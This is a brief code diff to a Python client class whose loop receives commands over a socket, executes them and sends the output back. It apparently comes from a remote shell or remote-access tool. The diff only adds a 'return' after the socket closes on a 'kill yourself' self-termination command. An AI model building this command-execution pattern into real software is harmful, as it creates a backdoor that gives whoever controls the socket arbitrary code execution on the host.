@@ -62,8 +62,11 @@ class Client():
 
             if not command:
                 continue
+
             elif "kill yourself" == command:
                 self.sock.close()
+                return
+            
             else:
                 result = self._exec_command(command)
                 self._send(result)
